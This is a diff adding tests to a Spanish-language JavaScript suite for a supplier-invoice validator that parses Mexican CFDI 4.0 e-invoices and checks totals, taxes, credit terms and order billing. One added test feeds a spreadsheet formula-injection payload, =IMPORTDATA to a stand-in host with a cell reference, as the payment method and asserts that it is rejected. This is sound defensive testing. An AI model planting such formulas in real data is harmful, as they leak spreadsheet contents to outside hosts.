@@ -12,11 +12,15 @@ const plano=o=>JSON.parse(JSON.stringify(o)); // objetos del contexto vm → obj
 const HELGEN='HSE240304PC1', PROV='EKU9003173C9', HOY='2026-10-27';
 const UUID1='6F1C5E2A-3B4D-4C5E-9F60-718293A4B5C6', UUID2='0A1B2C3D-4E5F-4A6B-8C7D-9E0F1A2B3C4D';
 
-/** CFDI 4.0 de prueba; o = cambios. Trae un Emisor falso en un comentario y un Impuestos por concepto (no deben leerse). */
+/** CFDI 4.0 de prueba; o = cambios. Trae un Emisor falso en un comentario y un Impuestos por concepto (no deben leerse).
+ *  Si no se dan, el IVA es 16 % de (subtotal − descuento) y el total cuadra: subtotal − descuento + trasladados − retenidos (+ locales). */
 function cfdi(o){
   const a=Object.assign({ns:'http://www.sat.gob.mx/cfd/4',version:'4.0',tipo:'I',fecha:'2026-10-20T10:15:00',serie:'A',folio:'1234',
-    moneda:'MXN',subtotal:'1000.00',descuento:null,total:'1160.00',metodo:'PUE',forma:'03',emisor:PROV,
-    nombreEmisor:'ESCUELA KEMPER URGATE &amp; CIA',receptor:HELGEN,uso:'G03',tras:'160.00',ret:null,uuid:UUID1.toLowerCase(),timbre:true},o||{});
+    moneda:'MXN',subtotal:'1000.00',descuento:null,metodo:'PUE',forma:'03',emisor:PROV,
+    nombreEmisor:'ESCUELA KEMPER URGATE &amp; CIA',receptor:HELGEN,uso:'G03',ret:null,local:null,uuid:UUID1.toLowerCase(),timbre:true},o||{});
+  const n=v=>Number(v||0), base=n(a.subtotal)-n(a.descuento);
+  if(!('tras' in (o||{}))) a.tras=(Math.round(base*16)/100).toFixed(2);
+  if(!('total' in (o||{}))) a.total=(base+n(a.tras)-n(a.ret)+(a.local?n(a.local.tras)-n(a.local.ret):0)).toFixed(2);
   return '﻿<?xml version="1.0" encoding="UTF-8"?>\n'+
   `<cfdi:Comprobante xmlns:cfdi="${a.ns}" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" Version="${a.version}" Serie="${a.serie}" Folio="${a.folio}"
     Fecha="${a.fecha}" SubTotal="${a.subtotal}"${a.descuento!=null?` Descuento="${a.descuento}"`:''} Moneda="${a.moneda}" Total="${a.total}"
@@ -32,7 +36,7 @@ function cfdi(o){
   <cfdi:Impuestos${a.tras!=null?` TotalImpuestosTrasladados="${a.tras}"`:''}${a.ret!=null?` TotalImpuestosRetenidos="${a.ret}"`:''}>
     <cfdi:Traslados><cfdi:Traslado Base="1000.00" Impuesto="002" TipoFactor="Tasa" TasaOCuota="0.160000" Importe="160.00"/></cfdi:Traslados>
   </cfdi:Impuestos>
-  <cfdi:Complemento>${a.timbre?`<tfd:TimbreFiscalDigital xmlns:tfd="http://www.sat.gob.mx/TimbreFiscalDigital" Version="1.1" UUID="${a.uuid}" FechaTimbrado="2026-10-20T10:16:00" RfcProvCertif="SAT970701NN3" SelloCFD="abc" NoCertificadoSAT="00001000000500000000" SelloSAT="def"/>`:''}</cfdi:Complemento>
+  <cfdi:Complemento>${a.local?`<implocal:ImpuestosLocales xmlns:implocal="http://www.sat.gob.mx/implocal" version="1.0" TotaldeRetenciones="${a.local.ret}" TotaldeTraslados="${a.local.tras}"/>`:''}${a.timbre?`<tfd:TimbreFiscalDigital xmlns:tfd="http://www.sat.gob.mx/TimbreFiscalDigital" Version="1.1" UUID="${a.uuid}" FechaTimbrado="2026-10-20T10:16:00" RfcProvCertif="SAT970701NN3" SelloCFD="abc" NoCertificadoSAT="00001000000500000000" SelloSAT="def"/>`:''}</cfdi:Complemento>
 </cfdi:Comprobante>`;
 }
 
@@ -56,6 +60,14 @@ function cfdi(o){
   falla(()=>ctx.leerCfdi(cfdi({timbre:false})),/no está timbrado/);
   falla(()=>ctx.leerCfdi(cfdi({total:'abc'})),/total del CFDI no es válido/);
   falla(()=>ctx.leerCfdi(cfdi({fecha:'20/10/2026'})),/fecha de emisión/);
+  // El total cuadra con sus partes (±0.02); el descuento no pasa del subtotal; los impuestos locales (implocal) cuentan
+  falla(()=>ctx.leerCfdi(cfdi({total:'99999.00'})),/no cuadra: su total \(\$99,999\.00\) no es .* \(\$1,160\.00\)/);
+  assert.strictEqual(ctx.leerCfdi(cfdi({total:'1160.02'})).total,1160.02,'redondeo');
+  falla(()=>ctx.leerCfdi(cfdi({total:'1160.03'})),/no cuadra/);
+  falla(()=>ctx.leerCfdi(cfdi({subtotal:'100.00',descuento:'1100.00',tras:'0.00',total:'0.01'})),/descuento es mayor que el subtotal/);
+  const l=ctx.leerCfdi(cfdi({local:{tras:'30.00',ret:'5.00'}}));
+  assert.deepStrictEqual([l.trasladados,l.retenidos,l.total],[190,5,1185],'ISH y 5 al millar');
+  falla(()=>ctx.leerCfdi(cfdi({local:{tras:'30.00',ret:'0.00'},total:'1160.00'})),/no cuadra/);
 }
 
 // ---- validarXml ----
@@ -73,6 +85,11 @@ function cfdi(o){
   assert.strictEqual(ctx.normalizarDiasCredito(' 180 '),180);
   ['','-1','1.5','181','treinta',null].forEach(v=>falla(()=>ctx.normalizarDiasCredito(v),/días de crédito/));
   assert.strictEqual(ctx.diasCreditoGuardados(''),0,'órdenes viejas = contado'); assert.strictEqual(ctx.diasCreditoGuardados(45),45);
+  // Órdenes anteriores sin días: los de sus condiciones de pago, si los dicen
+  assert.deepStrictEqual(['Crédito 30 días',' crédito  45 DIAS ','Neto 60 dias','Contado','Crédito a 500 días','',null].map(x=>ctx.diasCreditoDeCondiciones(x)),
+    [30,45,60,0,0,0,0]);
+  // UTF-8 con un punto de código fuera de rango (F4 90 80 80): no truena, queda como �
+  assert.strictEqual(ctx.textoUtf8([0x41,0xF4,0x90,0x80,0x80,0x42]).slice(0,2),'A\uFFFD');
   assert.strictEqual(ctx.fechaVencimiento('2026-10-27',30),'2026-11-26');
   assert.strictEqual(ctx.fechaVencimiento('2026-12-15',30),'2027-01-14');
   assert.strictEqual(ctx.fechaVencimiento('2028-02-28',1),'2028-02-29');
@@ -81,7 +98,7 @@ function cfdi(o){
 }
 
 // ---- validarFacturaProveedor: CFDI ----
-const OC={folio:'OC-2026-0001',estado:'Emitida',moneda:'MXN',subtotal:1000,rfc:PROV,proveedorId:PROV};
+const OC={folio:'OC-2026-0001',estado:'Emitida',moneda:'MXN',subtotal:1000,total:1160,rfc:PROV,proveedorId:PROV};
 const CTX=o=>Object.assign({rfcHelgen:HELGEN,hoy:HOY,facturas:[]},o||{});
 const leer=o=>ctx.leerCfdi(cfdi(o));
 {
@@ -111,11 +128,43 @@ const leer=o=>ctx.leerCfdi(cfdi(o));
   assert.strictEqual(ctx.validarFacturaProveedor(leer({subtotal:'1100.00',descuento:'100.00',total:'1160.00'}),OC,CTX()).neto,1000,'descuento');
   // Retenciones (persona física): el total baja, el neto (sin IVA) no
   assert.strictEqual(ctx.validarFacturaProveedor(leer({ret:'106.67',total:'1053.33'}),OC,CTX()).neto,1000);
+  // Método de pago: solo PUE o PPD (nada que Sheets lea como fórmula)
+  falla(()=>ctx.validarFacturaProveedor(leer({metodo:'=IMPORTDATA(&quot;https://x.example/?d=&quot;&amp;A2)'}),OC,CTX()),/PUE o PPD/);
+  falla(()=>ctx.validarFacturaProveedor(leer({metodo:''}),OC,CTX()),/PUE o PPD/);
+  // El total facturado tampoco pasa el total de la orden: orden al 0 % con factura al 16 %
+  falla(()=>ctx.validarFacturaProveedor(leer(),Object.assign({},OC,{total:1000}),CTX()),/total facturado de la orden OC-2026-0001 \(\$1,160\.00 MXN\) supera el total de la orden \(\$1,000\.00 MXN\)/);
+  const conTotal={...previa,total:696};
+  falla(()=>ctx.validarFacturaProveedor(leer({subtotal:'400.00',tras:'200.00',total:'600.00'}),OC,CTX({facturas:[conTotal]})),/supera el total de la orden/);
+  assert.strictEqual(ctx.validarFacturaProveedor(leer({subtotal:'400.00'}),OC,CTX({facturas:[conTotal]})).facturado,1000);
+  assert.strictEqual(ctx.netoFactura({subtotal:100,descuento:1100}),0,'el neto nunca es negativo');
+  // Orden sin RFC: el primer CFDI vigente fija el emisor; otro RFC (o una factura extranjera) ya no entra en esa orden
+  const OCS=Object.assign({},OC,{rfc:'',proveedorId:'SIN-RFC:kemper'});
+  const primera={folio:'FPR-2026-0007',tipo:'CFDI',uuid:UUID2,serieFolio:'A-1',rfcEmisor:PROV,proveedorId:'SIN-RFC:kemper',ocFolio:'OC-2026-0001',estado:'Vigente',subtotal:300,descuento:0};
+  const r2=ctx.validarFacturaProveedor(leer({subtotal:'500.00',total:'580.00'}),OCS,CTX({facturas:[primera]}));
+  assert.deepStrictEqual([r2.facturado,r2.actualizarRfc],[800,false],'mismo emisor: entra; el RFC ya se tomó con la primera');
+  falla(()=>ctx.validarFacturaProveedor(leer({emisor:'AAA010101AAA',subtotal:'500.00',total:'580.00'}),OCS,CTX({facturas:[primera]})),
+    /ya tiene facturas de RFC EKU9003173C9 \(FPR-2026-0007\)/);
+  falla(()=>ctx.validarFacturaProveedor(ctx.normalizarFacturaExtranjera({numero:'X1',fecha:'2026-10-10',moneda:'MXN',subtotal:'5'},HOY),OCS,
+    CTX({facturas:[primera]})),/ya tiene facturas CFDI de RFC EKU9003173C9/);
+  assert.strictEqual(ctx.validarFacturaProveedor(leer({emisor:'AAA010101AAA',subtotal:'500.00',total:'580.00'}),OCS,
+    CTX({facturas:[Object.assign({},primera,{estado:'Cancelada'})]})).actualizarRfc,true,'la cancelada no fija el emisor');
+}
+
+// ---- facturacionDeOrden: solo una orden facturada completa se paga por el total de sus facturas ----
+{
+  const O={folio:'OC-2026-0001',subtotal:1000};
+  const fa=(t,sub,o)=>Object.assign({folio:'F'+t,ocFolio:'oc-2026-0001',estado:'Vigente',subtotal:sub,descuento:0,total:t},o||{});
+  assert.deepStrictEqual(plano(ctx.facturacionDeOrden([],O)),{facturas:0,total:0,neto:0,completa:false});
+  assert.deepStrictEqual(plano(ctx.facturacionDeOrden([fa(696,600)],O)),{facturas:1,total:696,neto:600,completa:false},'parcial');
+  assert.strictEqual(ctx.facturacionDeOrden([fa(696,600),fa(357.33,399,{retenidos:106.67})],O).completa,true,'tolerancia 1.00');
+  assert.strictEqual(ctx.facturacionDeOrden([fa(696,600),fa(357,398.99)],O).completa,false);
+  assert.strictEqual(ctx.facturacionDeOrden([fa(1160,1000,{estado:'Cancelada'})],O).completa,false,'las canceladas no cuentan');
+  assert.strictEqual(ctx.facturacionDeOrden([fa(1160,1000,{ocFolio:'OC-2026-0002'})],O).facturas,0,'otra orden');
 }
 
 // ---- Factura extranjera (sin CFDI) ----
 {
-  const OCX={folio:'OC-2026-0003',estado:'Pagada',moneda:'USD',subtotal:250,rfc:'',proveedorId:'SIN-RFC:jlcpcb'};
+  const OCX={folio:'OC-2026-0003',estado:'Pagada',moneda:'USD',subtotal:250,total:250,rfc:'',proveedorId:'SIN-RFC:jlcpcb'};
   const ext=p=>ctx.normalizarFacturaExtranjera(Object.assign({numero:'W2026070815023249',fecha:'2026-10-10',moneda:'usd',subtotal:'240.5',impuestos:''},p||{}),HOY);
   const f=ext();
   assert.strictEqual(f.tipo,'Extranjera'); assert.strictEqual(f.uuid,''); assert.strictEqual(f.moneda,'USD');
@@ -126,6 +175,7 @@ const leer=o=>ctx.leerCfdi(cfdi(o));
   falla(()=>ext({subtotal:'0'}),/mayor a 0/);
   falla(()=>ext({subtotal:'-5'}),/no es válido/);
   falla(()=>ctx.validarFacturaProveedor(ext({moneda:'EUR'}),OCX,CTX()),/es en EUR y la orden OC-2026-0003 en USD/);
+  falla(()=>ctx.validarFacturaProveedor(ext({impuestos:'50000'}),OCX,CTX()),/supera el total de la orden \(\$250\.00 USD\)/,'impuestos mal capturados');
   falla(()=>ctx.validarFacturaProveedor(f,Object.assign({},OCX,{rfc:PROV}),CTX()),/tiene RFC mexicano \(EKU9003173C9\): registra su factura con el XML/);
   ctx.validarFacturaProveedor(f,Object.assign({},OCX,{rfc:'XEXX010101000'}),CTX()); // RFC genérico de extranjeros: sí se acepta
   const ya={folio:'FPR-2026-0005',tipo:'Extranjera',uuid:'',serieFolio:'w2026070815023249',proveedorId:'SIN-RFC:jlcpcb',ocFolio:'OC-2026-0002',estado:'Vigente',subtotal:5,descuento:0};
